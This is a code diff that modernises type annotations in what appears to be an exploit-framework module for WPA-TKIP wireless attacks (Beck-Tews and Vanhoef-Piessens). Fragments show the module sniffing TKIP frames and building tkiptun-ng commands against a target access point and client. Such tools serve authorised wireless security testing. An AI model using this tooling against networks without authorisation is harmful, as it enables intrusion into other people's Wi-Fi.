@@ -16,7 +16,6 @@ Requires: Scapy, aircrack-ng suite (tkiptun-ng, accepted dep), monitor-mode inte
 Version: 2.0.0
 """
 
-from __future__ import annotations
 
 import logging
 import os
@@ -110,7 +109,7 @@ Docs: https://www.aircrack-ng.org/doku.php?id=tkiptun-ng
 """
 
 
-def _which(binary: str) -> Optional[str]:
+def _which(binary: str) -> str | None:
     return shutil.which(binary)
 
 
@@ -251,7 +250,7 @@ class Exploit(Exploit):
             f"Beck-Tews (native michael_mic): scanning for TKIP QoS frames on {iface}..."
         )
         bssid_lower = bssid.lower()
-        captured: Optional[object] = None
+        captured: object | None = None
 
         def _grab_tkip_qos(pkt):
             nonlocal captured
@@ -364,7 +363,7 @@ class Exploit(Exploit):
             print_error("Set interface and target_bssid for Beck-Tews attack.")
             return
 
-        cmd: List[str] = [tkiptun, "-a", bssid]
+        cmd: list[str] = [tkiptun, "-a", bssid]
         if client:
             cmd.extend(["-h", client])
         cmd.append(iface)
@@ -391,7 +390,7 @@ class Exploit(Exploit):
             print_error("Set interface and target_bssid for Vanhoef-Piessens attack.")
             return
 
-        cmd: List[str] = [tkiptun, "-a", bssid, "-e"]
+        cmd: list[str] = [tkiptun, "-a", bssid, "-e"]
         if client:
             cmd.extend(["-h", client])
         cmd.append(iface)
@@ -451,7 +450,7 @@ class Exploit(Exploit):
             print_error("Set interface and target_bssid for tkiptun-ng bridge.")
             return
 
-        cmd: List[str] = [tkiptun, "-a", bssid]
+        cmd: list[str] = [tkiptun, "-a", bssid]
         if client:
             cmd.extend(["-h", client])
         cmd.append(iface)
@@ -459,7 +458,7 @@ class Exploit(Exploit):
         self._exec(cmd, "tkiptun-ng direct")
 
     # ---------------------------------------------------------------- helpers
-    def _require_tkiptun(self) -> Optional[str]:
+    def _require_tkiptun(self) -> str | None:
         """Locate the tkiptun-ng binary (part of aircrack-ng suite).
 
         Returns:
@@ -472,7 +471,7 @@ class Exploit(Exploit):
             return None
         return path
 
-    def _exec(self, cmd: List[str], label: str) -> None:
+    def _exec(self, cmd: list[str], label: str) -> None:
         """Execute a command, capturing and printing its output.
 
         Args:
